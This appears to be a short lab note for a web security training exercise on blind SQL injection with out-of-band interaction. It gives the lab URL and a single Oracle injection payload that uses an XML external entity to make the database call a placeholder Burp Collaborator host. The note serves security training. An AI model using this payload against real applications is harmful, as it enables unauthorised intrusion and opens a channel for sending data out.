# Lab: Blind SQL injection with out-of-band interaction

URL: https://0ab900d40391667b804f49c700cf00d6.web-security-academy.net/

![](./Images/img1.png)

Payload:

```
EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```